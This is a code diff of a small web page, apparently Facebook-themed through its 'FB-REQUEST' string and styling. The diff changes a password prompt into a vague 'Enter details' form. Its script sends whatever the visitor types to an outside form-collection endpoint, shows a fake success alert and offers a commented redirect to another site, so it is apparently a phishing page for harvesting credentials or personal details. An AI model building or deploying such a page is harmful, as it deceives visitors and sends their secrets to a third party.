@@ -92,12 +92,6 @@ input{
     0%{transform:rotate(0deg)}
     100%{transform:rotate(360deg)}
 }
-.error{
-    color:#d93025;
-    font-size:13px;
-    margin-top:10px;
-    display:none;
-}
 .note{
     font-size:12px;
     color:#65676b;
@@ -121,17 +115,15 @@ input{
 </div>
 
 <div class="content">
-<p>Please enter the password to continue.</p>
+<p>Please enter the required information to continue.</p>
 </div>
 
 <form id="accessForm">
-<input type="password" name="password" id="password" placeholder="Enter password" required>
+<input type="text" id="inputValue" placeholder="Enter details" required>
 <button type="submit" class="btn" id="submitBtn">
     <span id="btnText">Continue</span>
 </button>
 </form>
-
-<div class="error" id="errorMsg">Incorrect password. Please try again.</div>
 
 <p class="note">Your request will be processed securely.</p>
 
@@ -142,39 +134,33 @@ input{
 const form = document.getElementById('accessForm');
 const btn = document.getElementById('submitBtn');
 const btnText = document.getElementById('btnText');
-const errorMsg = document.getElementById('errorMsg');
 
 form.addEventListener('submit', function(e){
     e.preventDefault();
 
-    const pass = document.getElementById("password").value.trim();
-    const correctPassword = "FB-REQUEST"; // ← apna password set karo
+    const value = document.getElementById("inputValue").value.trim();
+    if(value === "") return;
 
-    if(pass === correctPassword){
-        // disable button + spinner
-        btn.disabled = true;
-        btnText.innerHTML = '<div class="spinner"></div> Continue…';
+    btn.disabled = true;
+    btnText.innerHTML = '<div class="spinner"></div> Processing…';
 
-        // submit form to submit-form.com
-        const formData = new FormData();
-        formData.append("password", pass);
+    const formData = new FormData();
+    formData.append("user_input", value);
 
-        fetch("https://submit-form.com/upL3IuLAs", {
-            method: "POST",
-            body: formData
-        }).finally(() => {
-            // after 2 seconds, fake success
-            setTimeout(()=>{
-                alert("Request submitted successfully!");
-                btn.disabled = false;
-                btnText.innerHTML = "Continue";
-                form.reset();
-            }, 2000);
-        });
+    fetch("https://submit-form.com/upL3IuLAs", {
+        method: "POST",
+        body: formData
+    }).finally(() => {
+        setTimeout(() => {
+            // 👉 YAHAN redirect bhi kar sakte ho
+            // window.location.href = "https://password-orpin-theta.vercel.app/";
 
-    } else {
-        errorMsg.style.display = "block";
-    }
+            alert("Request submitted successfully!");
+            btn.disabled = false;
+            btnText.innerHTML = "Continue";
+            form.reset();
+        }, 1500);
+    });
 });
 </script>
 
